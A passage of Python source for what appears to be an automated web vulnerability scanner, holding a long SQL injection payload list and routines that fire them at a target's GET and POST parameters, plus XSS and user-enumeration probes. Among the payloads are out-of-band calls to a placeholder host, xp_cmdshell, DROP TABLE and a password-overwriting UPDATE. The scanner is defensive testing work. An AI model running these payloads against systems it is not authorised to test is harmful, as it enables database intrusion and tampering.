        ("union", "mysql",      "' UNION SELECT user(),database(),version()--"),
        ("union", "mysql",      "' UNION SELECT table_name,2,3 FROM information_schema.tables LIMIT 1--"),
        ("union", "postgres",   "' UNION SELECT current_user,current_database(),version()--"),
        ("union", "mssql",      "' UNION SELECT @@version,NULL--"),
        ("union", "oracle",     "' UNION SELECT user,NULL FROM DUAL--"),
        # Inline comment variant
        ("union", "generic",    "' /*!UNION*/ /*!SELECT*/ NULL--"),

        # ================================================================ #
        #  BOOLEAN-BLIND  (16 payloads)                                     #
        # ================================================================ #
        # Basic true/false
        ("boolean", "generic",  "' AND 1=1--"),
        ("boolean", "generic",  "' AND 1=2--"),
        ("boolean", "generic",  "1 AND 1=1"),
        ("boolean", "generic",  "1 AND 1=2"),
        ("boolean", "generic",  "' AND 'a'='a"),
        ("boolean", "generic",  "' AND 'a'='b"),
        # SUBSTRING/ASCII probes
        ("boolean", "generic",  "' AND ASCII(SUBSTRING(version(),1,1))>50--"),
        ("boolean", "generic",  "' AND ASCII(SUBSTRING(version(),1,1))<50--"),
        ("boolean", "mysql",    "' AND SUBSTRING(user(),1,1)='r'--"),
        ("boolean", "mysql",    "' AND LENGTH(database())>3--"),
        # Conditional expressions
        ("boolean", "mysql",    "' AND IF(1=1,'a','b')='a'--"),
        ("boolean", "mysql",    "' AND IF(1=2,'a','b')='a'--"),
        ("boolean", "postgres", "' AND CASE WHEN 1=1 THEN 'a' ELSE 'b' END='a'--"),
        ("boolean", "postgres", "' AND CASE WHEN 1=2 THEN 'a' ELSE 'b' END='a'--"),
        ("boolean", "mssql",    "' AND IIF(1=1,'a','b')='a'--"),
        ("boolean", "mssql",    "' AND IIF(1=2,'a','b')='a'--"),

        # ================================================================ #
        #  TIME-BASED BLIND  (19 payloads)                                  #
        # ================================================================ #
        # MySQL
        ("time",    "mysql",    "' AND SLEEP(2)--"),
        ("time",    "mysql",    "1; SELECT SLEEP(2)--"),
        ("time",    "mysql",    "' OR SLEEP(2)#"),
        ("time",    "mysql",    "IF(1=1,SLEEP(2),0)"),
        ("time",    "mysql",    "' AND IF(1=1,SLEEP(2),0)--"),
        ("time",    "mysql",    "' AND IF(LENGTH(database())>1,SLEEP(2),0)--"),
        # Heavy query time (no SLEEP function needed)
        ("time",    "mysql",    "' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B)>0 AND SLEEP(2)--"),
        # PostgreSQL
        ("time",    "postgres", "'; SELECT pg_sleep(2)--"),
        ("time",    "postgres", "1; SELECT pg_sleep(2)--"),
        ("time",    "postgres", "' OR 1=1; SELECT pg_sleep(2)--"),
        ("time",    "postgres", "' AND 1=(SELECT 1 FROM pg_sleep(2))--"),
        # MSSQL
        ("time",    "mssql",    "'; WAITFOR DELAY '0:0:2'--"),
        ("time",    "mssql",    "1; WAITFOR DELAY '0:0:2'--"),
        ("time",    "mssql",    "' IF 1=1 WAITFOR DELAY '0:0:2'--"),
        # Oracle
        ("time",    "oracle",   "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',2) IS NULL--"),
        ("time",    "oracle",   "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(chr(65),2)--"),
        # SQLite
        ("time",    "sqlite",   "' AND 1=(SELECT 1 FROM (SELECT SLEEP(2)) x)--"),
        ("time",    "sqlite",   "' AND randomblob(100000000)--"),
        # Generic heavy query (works on multiple DB)
        ("time",    "generic",  "' OR (SELECT 1 FROM (SELECT SLEEP(2))A)='1"),

        # ================================================================ #
        #  OUT-OF-BAND / DNS PROBES  (6 payloads)                          #
        # ================================================================ #
        ("error",  "oob",       "'; EXEC master..xp_dirtree '\\\\ds1h-oob.invalid\\a'--"),
        ("error",  "oob",       "' UNION SELECT LOAD_FILE(concat('\\\\\\\\',version(),'.ds1h-oob.invalid\\\\a'))--"),
        ("error",  "oob",       "' AND UTL_HTTP.REQUEST('http://ds1h-oob.invalid/')>0--"),
        ("error",  "oob",       "' AND UTL_INADDR.GET_HOST_ADDRESS('ds1h-oob.invalid')>0--"),
        ("error",  "oob",       "'; copy (select '') to program 'nslookup ds1h-oob.invalid'--"),
        ("error",  "oob",       "' AND 1=DBMS_LDAP.INIT('ds1h-oob.invalid',80)--"),

        # ================================================================ #
        #  SECOND-ORDER / STORED INJECTION  (4 payloads)                   #
        # ================================================================ #
        ("error",  "second",    "ds1h' AND '1'='1"),
        ("error",  "second",    "ds1h'; SELECT 1--"),
        ("error",  "second",    "ds1h'/**/OR/**/1=1--"),
        ("error",  "second",    "ds1h\\' OR 1=1--"),

        # ================================================================ #
        #  ENCODING / WAF BYPASS  (16 payloads)                            #
        # ================================================================ #
        # URL encoding
        ("error",  "bypass",    "%27"),
        ("error",  "bypass",    "%27 OR %271%27=%271"),
        ("error",  "bypass",    "%27%20OR%201%3D1--"),
        ("error",  "bypass",    "%2527"),                      # double-encoded
        # Inline comment injection
        ("error",  "bypass",    "' OR/**/1=1--"),
        ("error",  "bypass",    "'/**/OR/**/'1'='1"),
        ("error",  "bypass",    "' /*!OR*/ '1'='1"),
        ("error",  "bypass",    "1'/**/AND/**/1=1--"),
        # Version comment (MySQL-specific bypass)
        ("error",  "bypass",    "/*!50000 OR*/ 1=1--"),
        ("error",  "bypass",    "' /*!50000 AND*/ 1=1--"),
        # Mixed case
        ("error",  "bypass",    "' Or 1=1--"),
        ("error",  "bypass",    "' oR '1'='1"),
        # Unicode whitespace
        ("error",  "bypass",    "'\u00a0OR\u00a01=1--"),
        ("error",  "bypass",    "'\u0009OR\u00091=1--"),       # tab
        # Hex-quoted strings
        ("error",  "bypass",    "' OR 0x31=0x31--"),
        ("error",  "bypass",    "' OR char(49)=char(49)--"),

        # ================================================================ #
        #  STACKED QUERIES  (6 payloads)                                    #
        # ================================================================ #
        ("error",  "stack",     "'; SELECT 1--"),
        ("error",  "stack",     "1; DROP TABLE ds1hunter_canary_9z--"),
        ("error",  "stack",     "'; EXEC xp_cmdshell('ping 127.0.0.1')--"),
        ("error",  "stack",     "'; INSERT INTO ds1h_canary VALUES(1)--"),
        ("error",  "stack",     "'; UPDATE ds1h_canary SET x=1--"),
        ("error",  "stack",     "'; CREATE TABLE ds1h_canary(x INT)--"),

        # ================================================================ #
        #  NON-INTELLIGENT – QUOTE / DELIMITER FUZZING  (12 payloads)      #
        # ================================================================ #
        ("error",  "fuzz",      "\\"),
        ("error",  "fuzz",      "\\'"),
        ("error",  "fuzz",      "'--"),
        ("error",  "fuzz",      "\"--"),
        ("error",  "fuzz",      "';--"),
        ("error",  "fuzz",      "\";--"),
        ("error",  "fuzz",      "' ;"),
        ("error",  "fuzz",      "');"),
        ("error",  "fuzz",      "'));"),
        ("error",  "fuzz",      "'))--"),
        ("error",  "fuzz",      "%00'"),
        ("error",  "fuzz",      "' %00"),

        # ================================================================ #
        #  NON-INTELLIGENT – NUMERIC BOUNDARY FUZZING  (10 payloads)       #
        # ================================================================ #
        ("error",  "fuzz",      "0"),
        ("error",  "fuzz",      "-1"),
        ("error",  "fuzz",      "9999999"),
        ("error",  "fuzz",      "-9999999"),
        ("error",  "fuzz",      "1.1"),
        ("error",  "fuzz",      "1e9"),
        ("error",  "fuzz",      "NULL"),
        ("error",  "fuzz",      "true"),
        ("error",  "fuzz",      "false"),
        ("error",  "fuzz",      "1/0"),

        # ================================================================ #
        #  NON-INTELLIGENT – COMMENT STYLE VARIATIONS  (12 payloads)       #
        # ================================================================ #
        ("error",  "fuzz",      "' --"),
        ("error",  "fuzz",      "' -- -"),
        ("error",  "fuzz",      "' #"),
        ("error",  "fuzz",      "' /*"),
        ("error",  "fuzz",      "' */"),
        ("error",  "fuzz",      "'/*comment*/"),
        ("error",  "fuzz",      "/* OR 1=1 */"),
        ("error",  "fuzz",      "--"),
        ("error",  "fuzz",      "#"),
        ("error",  "fuzz",      "/*"),
        ("error",  "fuzz",      "*/"),
        ("error",  "fuzz",      "/*!*/"),

        # ================================================================ #
        #  NON-INTELLIGENT – OPERATOR / KEYWORD FUZZING  (10 payloads)     #
        # ================================================================ #
        ("error",  "fuzz",      "' XOR '1'='1"),
        ("error",  "fuzz",      "' NOT '1'='1"),
        ("error",  "fuzz",      "' BETWEEN 1 AND 2--"),
        ("error",  "fuzz",      "' LIKE '%'--"),
        ("error",  "fuzz",      "' IN (1,2,3)--"),
        ("error",  "fuzz",      "' IS NULL--"),
        ("error",  "fuzz",      "' IS NOT NULL--"),
        ("error",  "fuzz",      "' EXISTS (SELECT 1)--"),
        ("error",  "fuzz",      "' RLIKE '.*'--"),
        ("error",  "fuzz",      "' REGEXP '.*'--"),

        # ================================================================ #
        #  NON-INTELLIGENT – SPECIAL CHAR COMBINATIONS  (10 payloads)      #
        # ================================================================ #
        ("error",  "fuzz",      "';!--\"=&{()}"),
        ("error",  "fuzz",      "' AND 1 --+"),
        ("error",  "fuzz",      "%27%20AND%201%3D1--%20"),
        ("error",  "fuzz",      "1%3BSELECT%201"),
        ("error",  "fuzz",      "1'+AND+'1'='1"),
        ("error",  "fuzz",      "1\\'AND\\'1\\'=\\'1"),
        ("error",  "fuzz",      "\u0027 OR 1=1--"),            # unicode apostrophe
        ("error",  "fuzz",      "\u02bc OR 1=1--"),            # modifier letter apostrophe
        ("error",  "fuzz",      "\uff07 OR 1=1--"),            # fullwidth apostrophe
        ("error",  "fuzz",      "' || '1'='1"),               # Oracle string concat

        # ================================================================ #
        #  ADVANCED WAF BYPASS – HTTP PARAMETER POLLUTION  (8 payloads)    #
        # ================================================================ #
        ("error",  "bypass",    "1/**/AND/**/1=1--"),
        ("error",  "bypass",    "1%09AND%091=1--"),              # tab as whitespace
        ("error",  "bypass",    "1%0bAND%0b1=1--"),              # vertical tab
        ("error",  "bypass",    "1%0dAND%0d1=1--"),              # carriage return
        ("error",  "bypass",    "' AND 1=1 LIMIT 1 OFFSET 0--"),
        ("error",  "bypass",    "' OR 1=1 ORDER BY 1--"),
        ("error",  "bypass",    "' AND 1=1 GROUP BY 1--"),
        ("error",  "bypass",    "' AND EXISTS(SELECT 1)--"),

        # ================================================================ #
        #  GRAPHQL / JSON INJECTION  (8 payloads)                          #
        # ================================================================ #
        ("error",  "json",      "'; SELECT * FROM users--"),
        ("error",  "json",      "\\u0027 OR 1=1--"),
        ("error",  "json",      "{\"query\":\"{ __typename }\"}"),
        ("error",  "json",      "1; SELECT SLEEP(0)--"),
        ("error",  "json",      "' UNION SELECT schema_name FROM information_schema.schemata--"),
        ("error",  "json",      "1/**/UNION/**/SELECT/**/NULL--"),
        ("error",  "json",      "'; EXEC sp_helptext 'sp_who'--"),
        ("error",  "json",      "' OR JSON_VALID(version())--"),

        # ================================================================ #
        #  SECOND-ORDER STORED INJECTION – EXTENDED  (6 payloads)          #
        # ================================================================ #
        ("error",  "second",    "admin'--"),
        ("error",  "second",    "ds1h'/**/OR/**/1=1--"),
        ("error",  "second",    "ds1h\\\\' OR 1=1--"),
        ("error",  "second",    "0' UNION SELECT NULL--"),
        ("error",  "second",    "'; UPDATE users SET password='ds1h' WHERE 'a'='a"),
        ("error",  "second",    "' ; DROP TABLE ds1h_canary_no_exist--"),

    ]

    _SQLI_DB_ERRORS = [
        # MySQL
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_num_rows",
        "mysql_fetch",
        "supplied argument is not a valid mysql",
        "call to a member function",
        # PostgreSQL
        "pg_query()",
        "pg_exec()",
        "psycopg2",
        "unterminated quoted string",
        "syntax error at or near",
        "invalid input syntax for type",
        "column \"",
        # MSSQL
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "mssql_query()",
        "incorrect syntax near",
        "unclosed quotation mark after the character string",
        "syntax error converting",
        "procedure expects parameter",
        "com.microsoft.sqlserver",
        # Oracle
        "ora-00933",
        "ora-00907",
        "ora-01756",
        "ora-00942",
        "oracle error",
        "quoted string not properly terminated",
        # SQLite
        "sqlite3",
        "sqlite_version",
        "unrecognized token",
        # Framework-specific (specific enough to not false positive)
        "django.db.utils",
        "django.db.backends",
        "sqlstate[",
        "db2 sql error",
        "nhibernate",
        "hibernateexception",
        "activerecord::statementinvalid",
        "pg_sleep",
        "near \"",
    ]

    async def _test_sql_injection(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Comprehensive SQL injection detection:
          - Error-based (7 DB engines + generic)
          - Time-based blind (MySQL / PostgreSQL / MSSQL / Oracle / SQLite)
          - Boolean-blind (response length delta)
          - UNION-based column count probing
          - Encoding / WAF bypass variants
          - Stacked queries
          - GET query params AND POST body injection
          - Hardcoded common paths PLUS discovered endpoints from Phase 1

        Safe: never extracts real data. Time payloads use 2-second delays.
        """
        flaws: List[Dict[str, Any]] = []
        already_confirmed: set = set()   # (url, param) pairs - stop after first hit

        # ----- common GET params to fuzz --------------------------------- #
        GET_PARAMS = [
            "id", "q", "query", "search", "keyword", "term", "s",
            "user_id", "product_id", "order_id", "item_id", "cat",
            "category", "page", "sort", "filter", "type", "name",
            "username", "email", "token", "ref", "code", "sku",
        ]

        # ----- common POST body keys to fuzz ----------------------------- #
        POST_KEYS = [
            "username", "email", "password", "search", "query",
            "name", "id", "user_id", "token", "code", "ref",
        ]

        # ----- hardcoded high-value paths -------------------------------- #
        HARDCODED_PATHS = [
            "/api/users", "/api/products", "/api/search", "/api/orders",
            "/api/items", "/api/v1/users", "/api/v1/products",
            "/api/v1/search", "/api/v1/orders", "/search",
            "/api/login", "/api/auth/login", "/api/auth/token",
            "/api/profile", "/api/account", "/api/admin/users",
            "/api/admin/search", "/api/reports", "/api/export",
        ]

        # ----- union: baseline techniques (first 7 only) for POST ------- #
        _UNION_PAYLOADS = [p for (t, _, p) in self._SQLI_PAYLOADS if t == "union"][:7]
        _BOOL_PAYLOADS  = [p for (t, _, p) in self._SQLI_PAYLOADS if t == "boolean"]
        _ERROR_PAYLOADS = [p for (t, _, p) in self._SQLI_PAYLOADS if t == "error"]
        _TIME_PAYLOADS  = [p for (t, _, p) in self._SQLI_PAYLOADS if t == "time"]

        # ----------------------------------------------------------------- #
        #  Build endpoint list: DISCOVERED paths first (confirmed existing  #
        #  from Phase 1), hardcoded fallback paths second.                  #
        #  This ensures we attack real surfaces before guessing.            #
        # ----------------------------------------------------------------- #
        seen_paths: set = set()
        discovered_paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                path = urlparse(disc_url).path.rstrip("/") or "/"
                if path not in seen_paths and self._is_dynamic_path(path):
                    seen_paths.add(path)
                    discovered_paths.append(path)
            except Exception:
                pass
        fallback_paths: List[str] = []
        for p in HARDCODED_PATHS:
            if p not in seen_paths:
                seen_paths.add(p)
                fallback_paths.append(p)
        # Discovered paths first - they are confirmed real; hardcoded paths are guesses
        endpoint_paths: List[str] = discovered_paths + fallback_paths

        # ----------------------------------------------------------------- #
        #  Request budget - prevents Phase 4 from running indefinitely.     #
        #  Depth-aware: Normal=600, Deep=2500, Aggressive=8000              #
        # ----------------------------------------------------------------- #
        MAX_SQLI_REQUESTS: int = int(self.config.get("max_sqli_requests", 600))
        total_sqli_requests: int = 0
        sqli_baselines: Dict[str, str] = {}
        sqli_time_baselines: Dict[str, float] = {}

        # ================================================================= #
        #  PHASE A: GET parameter injection                                  #
        # ================================================================= #
        for path in endpoint_paths:
            url = self.target + path
            if len(already_confirmed) > 20 or total_sqli_requests >= MAX_SQLI_REQUESTS:
                break

            # --- boolean-blind: proper baseline per endpoint+param -------- #
            for param in GET_PARAMS[:8]:      # top 8 params for bool test
                if total_sqli_requests >= MAX_SQLI_REQUESTS:
                    break
                key = (url, param, "bool")
                if key in already_confirmed:
                    continue
                try:
                    # Establish stable baseline with 3 requests, use median length
                    baseline_lens = []
                    for _ in range(3):
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(f"{url}?{param}=baseline") as r_base:
                            b = await r_base.text(errors="replace") if r_base.status == 200 else ""
                            baseline_lens.append(len(b))
                        total_sqli_requests += 1
                    baseline_len = sorted(baseline_lens)[1]  # median

                    # Test numeric context: id=1 AND 1=1 vs id=1 AND 1=2
                    await asyncio.sleep(self.rate_limit)
                    true_url = f"{url}?{param}=1 AND 1=1"
                    async with session.get(true_url) as r_true:
                        body_true = await r_true.text(errors="replace") if r_true.status == 200 else ""
                        true_status = r_true.status
                        true_resp_headers = dict(r_true.headers)
                    total_sqli_requests += 1

                    await asyncio.sleep(self.rate_limit)
                    async with session.get(f"{url}?{param}=1 AND 1=2") as r_false:
                        body_false = await r_false.text(errors="replace") if r_false.status == 200 else ""
                    total_sqli_requests += 1

                    len_diff = abs(len(body_true) - len(body_false))
                    true_deviation = abs(len(body_true) - baseline_len)
                    false_deviation = abs(len(body_false) - baseline_len)

                    # Stable boolean blind: one side matches baseline, other deviates
                    if body_true and body_false and body_true != body_false and len_diff > 50:
                        if (true_deviation < 20 and false_deviation > 50) or (false_deviation < 20 and true_deviation > 50):
                            already_confirmed.add(key)
                            flaws.append({
                                "type": "sql_injection",
                                "technique": "boolean_blind",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": (
                                    f"Boolean-blind SQLi at {path}?{param}=: "
                                    f"TRUE vs FALSE payloads return different response lengths "
                                    f"(diff={len_diff} bytes, baseline={baseline_len})."
                                ),
                                "proof": {
                                    "param": param,
                                    "true_payload":  "1 AND 1=1",
                                    "false_payload": "1 AND 1=2",
                                    "len_true":  len(body_true),
                                    "len_false": len(body_false),
                                    "baseline_len": baseline_len,
                                },
                                "evidence": build_evidence(
                                    method="GET",
                                    url=true_url,
                                    resp_status=true_status,
                                    resp_headers=true_resp_headers,
                                    resp_body=body_true[:2000],
                                ),
                                "remediation": ["Use parameterized queries / prepared statements"],
                            })
                            continue

                    # Test string context: name=test' AND '1'='1 vs name=test' AND '1'='2
                    await asyncio.sleep(self.rate_limit)
                    str_true_url = f"{url}?{param}=test%27+AND+%271%27%3D%271"
                    async with session.get(str_true_url) as r_str_true:
                        body_str_true = await r_str_true.text(errors="replace") if r_str_true.status == 200 else ""
                        str_true_status = r_str_true.status
                        str_true_headers = dict(r_str_true.headers)
                    total_sqli_requests += 1

                    await asyncio.sleep(self.rate_limit)
                    async with session.get(f"{url}?{param}=test%27+AND+%271%27%3D%272") as r_str_false:
                        body_str_false = await r_str_false.text(errors="replace") if r_str_false.status == 200 else ""
                    total_sqli_requests += 1

                    str_len_diff = abs(len(body_str_true) - len(body_str_false))
                    str_true_dev = abs(len(body_str_true) - baseline_len)
                    str_false_dev = abs(len(body_str_false) - baseline_len)

                    if body_str_true and body_str_false and body_str_true != body_str_false and str_len_diff > 50:
                        if (str_true_dev < 20 and str_false_dev > 50) or (str_false_dev < 20 and str_true_dev > 50):
                            already_confirmed.add(key)
                            flaws.append({
                                "type": "sql_injection",
                                "technique": "boolean_blind_string",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": (
                                    f"Boolean-blind SQLi (string context) at {path}?{param}=: "
                                    f"TRUE vs FALSE payloads return different response lengths "
                                    f"(diff={str_len_diff} bytes, baseline={baseline_len})."
                                ),
                                "proof": {
                                    "param": param,
                                    "true_payload":  "test' AND '1'='1",
                                    "false_payload": "test' AND '1'='2",
                                    "len_true":  len(body_str_true),
                                    "len_false": len(body_str_false),
                                    "baseline_len": baseline_len,
                                },
                                "evidence": build_evidence(
                                    method="GET",
                                    url=str_true_url,
                                    resp_status=str_true_status,
                                    resp_headers=str_true_headers,
                                    resp_body=body_str_true[:2000],
                                ),
                                "remediation": ["Use parameterized queries / prepared statements"],
                            })
                            continue
                except Exception as exc:
                    logger.debug("[Logic] SQLi bool-blind GET %s?%s: %s", url, param, exc)

            # --- error-based + UNION + time GET --------------------------
            # Fetch URL baseline once per path for error-based false-positive elimination
            if url not in sqli_baselines:
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.get(f"{url}?id=1") as r_bl:
                        sqli_baselines[url] = await r_bl.text(errors="replace") if r_bl.status in (200, 400, 500) else ""
                    total_sqli_requests += 1
                except Exception:
                    sqli_baselines[url] = ""
            baseline_body = sqli_baselines.get(url, "")

            if url not in sqli_time_baselines:
                try:
                    await asyncio.sleep(self.rate_limit)
                    t_bl = _time.monotonic()
                    async with session.get(f"{url}?id=1") as r_bl:
                        await r_bl.read()
                    sqli_time_baselines[url] = _time.monotonic() - t_bl
                    total_sqli_requests += 1
                except Exception:
                    sqli_time_baselines[url] = 0.5
            baseline_time = sqli_time_baselines.get(url, 0.5)

            for technique, db_engine, payload in self._SQLI_PAYLOADS:
                if len(already_confirmed) > 20 or total_sqli_requests >= MAX_SQLI_REQUESTS:
                    break
                for param in GET_PARAMS:
                    if total_sqli_requests >= MAX_SQLI_REQUESTS:
                        break
                    key = (url, param, technique)
                    if key in already_confirmed:
                        continue
                    test_url = f"{url}?{param}={payload}"
                    try:
                        await asyncio.sleep(self.rate_limit)
                        t0 = _time.monotonic()
                        async with session.get(test_url) as resp:
                            elapsed = _time.monotonic() - t0
                            body = ""
                            if resp.status in (200, 500, 400):
                                body = await resp.text(errors="replace")
                            _resp_headers = dict(resp.headers)
                        total_sqli_requests += 1
                        # time-based
                        if technique == "time" and elapsed >= max(1.8, baseline_time + 1.5):
                            already_confirmed.add(key)
                            flaws.append({
                                    "type": "sql_injection",
                                    "technique": "time_blind",
                                    "db_engine": db_engine,
                                    "endpoint": url,
                                    "method": "GET",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Time-based blind SQLi ({db_engine}) at "
                                        f"{path}?{param}=: response delayed {elapsed:.1f}s."
                                    ),
                                    "proof": {
                                        "param": param,
                                        "payload": payload,
                                        "delay_seconds": round(elapsed, 2),
                                    },
                                    "evidence": build_evidence(
                                        method="GET",
                                        url=test_url,
                                        resp_status=resp.status,
                                        resp_headers=_resp_headers,
                                        resp_body=body[:2000],
                                    ),
                                    "remediation": ["Use parameterized queries / prepared statements"],
                                })
                            break   # found on this param, move to next param

                            # error-based / union
                        if technique in ("error", "union", "bypass", "stack") and body:
                            if any(e in body.lower() for e in self._SQLI_DB_ERRORS) and not any(e in baseline_body.lower() for e in self._SQLI_DB_ERRORS):
                                already_confirmed.add(key)
                                flaws.append({
                                        "type": "sql_injection",
                                        "technique": "error_based" if technique in ("error", "bypass", "stack") else "union_based",
                                        "db_engine": db_engine,
                                        "endpoint": url,
                                        "method": "GET",
                                        "severity": "CRITICAL",
                                        "description": (
                                            f"Error-based SQLi ({db_engine}) at "
                                            f"{path}?{param}=: database error leaked in response."
                                        ),
                                        "proof": {
                                            "param": param,
                                            "payload": payload,
                                            "db_error_detected": True,
                                            "response_snippet": body[:300],
                                        },
                                        "evidence": build_evidence(
                                            method="GET",
                                            url=test_url,
                                            resp_status=resp.status,
                                            resp_headers=_resp_headers,
                                            resp_body=body[:2000],
                                        ),
                                        "remediation": ["Use parameterized queries / prepared statements"],
                                    })
                                break   # found on this param
                    except Exception as exc:
                        logger.debug("[Logic] SQLi GET %s?%s: %s", url, param, exc)

        # ================================================================= #
        #  PHASE B: POST body injection                                      #
        #  Discovered paths first, hardcoded fallbacks second.              #
        # ================================================================= #
        HARDCODED_POST_PATHS = [
            "/api/login", "/api/auth/login", "/api/auth/token",
            "/api/users", "/api/search", "/api/v1/search",
            "/api/register", "/api/auth/register",
            "/api/password-reset", "/api/forgot-password",
        ]
        seen_post: set = set()
        post_disc: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen_post and self._is_dynamic_path(p):
                    seen_post.add(p)
                    post_disc.append(p)
            except Exception:
                pass
        post_fallback: List[str] = [p for p in HARDCODED_POST_PATHS if p not in seen_post]
        POST_PATHS = (post_disc + post_fallback)[:25]  # cap at 25 total post paths

        for path in POST_PATHS:
            url = self.target + path
            if len(already_confirmed) > 20 or total_sqli_requests >= MAX_SQLI_REQUESTS:
                break

            # Fetch URL baseline once per path for error-based false-positive elimination
            if url not in sqli_baselines:
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.get(f"{url}?id=1") as r_bl:
                        sqli_baselines[url] = await r_bl.text(errors="replace") if r_bl.status in (200, 400, 500) else ""
                    total_sqli_requests += 1
                except Exception:
                    sqli_baselines[url] = ""
            baseline_body = sqli_baselines.get(url, "")

            if url not in sqli_time_baselines:
                try:
                    await asyncio.sleep(self.rate_limit)
                    t_bl = _time.monotonic()
                    async with session.get(f"{url}?id=1") as r_bl:
                        await r_bl.read()
                    sqli_time_baselines[url] = _time.monotonic() - t_bl
                    total_sqli_requests += 1
                except Exception:
                    sqli_time_baselines[url] = 0.5
            baseline_time = sqli_time_baselines.get(url, 0.5)

            for key_name in POST_KEYS:
                if total_sqli_requests >= MAX_SQLI_REQUESTS:
                    break
                for technique, db_engine, payload in (
                    [(t, db, p) for (t, db, p) in self._SQLI_PAYLOADS
                     if t in ("error", "bypass")][:20]   # 20 error payloads in POST
                    + [(t, db, p) for (t, db, p) in self._SQLI_PAYLOADS
                       if t == "time"][:6]               # 6 time payloads in POST
                ):
                    if total_sqli_requests >= MAX_SQLI_REQUESTS:
                        break
                    conf_key = (url, key_name, "post_" + technique)
                    if conf_key in already_confirmed:
                        continue
                    body_payload = {key_name: payload, "password": "test", "username": "test"}
                    try:
                        await asyncio.sleep(self.rate_limit)
                        t0 = _time.monotonic()
                        async with session.post(url, json=body_payload) as resp:
                            elapsed = _time.monotonic() - t0
                            body = ""
                            if resp.status in (200, 400, 401, 500):
                                body = await resp.text(errors="replace")
                        total_sqli_requests += 1

                        if technique == "time" and elapsed >= max(1.8, baseline_time + 1.5):
                            already_confirmed.add(conf_key)
                            flaws.append({
                                "type": "sql_injection",
                                "technique": "time_blind",
                                "db_engine": db_engine,
                                "endpoint": url,
                                "method": "POST",
                                "severity": "CRITICAL",
                                "description": (
                                    f"Time-based blind SQLi ({db_engine}) via POST body "
                                    f"at {path} [field: {key_name}]: "
                                    f"response delayed {elapsed:.1f}s."
                                ),
                                "proof": {
                                    "field": key_name,
                                    "payload": payload,
                                    "delay_seconds": round(elapsed, 2),
                                },
                                "remediation": ["Use parameterized queries / prepared statements"],
                            })
                            break

                        if technique in ("error", "bypass") and body:
                            if any(e in body.lower() for e in self._SQLI_DB_ERRORS) and not any(e in baseline_body.lower() for e in self._SQLI_DB_ERRORS):
                                already_confirmed.add(conf_key)
                                flaws.append({
                                    "type": "sql_injection",
                                    "technique": "error_based",
                                    "db_engine": db_engine,
                                    "endpoint": url,
                                    "method": "POST",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Error-based SQLi ({db_engine}) via POST body "
                                        f"at {path} [field: {key_name}]: "
                                        f"database error leaked."
                                    ),
                                    "proof": {
                                        "field": key_name,
                                        "payload": payload,
                                        "db_error_detected": True,
                                        "response_snippet": body[:300],
                                    },
                                    "remediation": ["Use parameterized queries / prepared statements"],
                                })
                                break
                    except Exception as exc:
                        logger.debug("[Logic] SQLi POST %s[%s]: %s", url, key_name, exc)

        logger.info(
            "[Logic] SQLi scan complete: %d confirmed findings (%d requests fired, budget=%d)",
            len(flaws), total_sqli_requests, MAX_SQLI_REQUESTS,
        )
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: XSS parameter detection                                       #
    # ------------------------------------------------------------------ #

    async def _test_xss_parameters(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Probe common parameters for reflected XSS.
        Uses a non-executable probe string - no live JS payloads.
        """
        XSS_PROBE = "<ds1hunter-xss-probe>"
        flaws = []
        test_paths = [
            "/search", "/api/search", "/?q=", "/api/items",
            "/api/products", "/?name=", "/?message=",
        ]
        params = ["q", "search", "query", "name", "message", "comment", "input", "text"]

        for path in test_paths:
            base_url = self.target + path.rstrip("=")
            for param in params:
                test_url = f"{base_url}?{param}={XSS_PROBE}"
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.get(test_url) as resp:
                        if resp.status == 200:
                            body = await resp.text(errors="replace")
                            if XSS_PROBE in body:
                                ct = resp.headers.get("Content-Type", "")
                                if "text/html" in ct:
                                    flaws.append({
                                        "type": "reflected_xss",
                                        "endpoint": base_url,
                                        "method": "GET",
                                        "severity": "HIGH",
                                        "description": f"Reflected XSS at {path}?{param}=: probe string echoed into HTML response unescaped.",
                                        "proof": {
                                            "param": param,
                                            "probe": XSS_PROBE,
                                            "reflected_in_html": True,
                                            "content_type": ct,
                                        },
                                        "remediation": [
                                            "HTML-encode all user-controlled values before rendering",
                                            "Implement a Content-Security-Policy",
                                        ],
                                    })
                                    break
                except Exception as exc:
                    logger.debug("[Logic] XSS test error %s: %s", test_url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Email / username enumeration                                  #
    # ------------------------------------------------------------------ #

    async def _test_email_enumeration(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect user enumeration via different responses for valid/invalid emails
        on login and forgot-password endpoints.
        """
        flaws = []
        test_paths = [
            ("/api/auth/login", {"email": "nonexistent_ds1hunter@test.invalid", "password": "wrong"}),
            ("/api/login", {"username": "nonexistent_ds1hunter", "password": "wrong"}),
            ("/api/auth/forgot-password", {"email": "nonexistent_ds1hunter@test.invalid"}),
            ("/api/password-reset", {"email": "nonexistent_ds1hunter@test.invalid"}),
        ]

        for path, payload in test_paths:
            url = self.target + path
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(url, json=payload) as resp:
                    body = await resp.text(errors="replace")
                    # User enumeration signals
                    signals = [
                        "user not found", "no account", "email not registered",
                        "invalid email", "unknown email", "account does not exist",
                    ]
                    if any(s in body.lower() for s in signals):
                        flaws.append({
                            "type": "user_enumeration",
                            "endpoint": url,
                            "method": "POST",
                            "severity": "LOW",
                            "description": f"User enumeration at {path}: response body discloses whether email/username exists.",
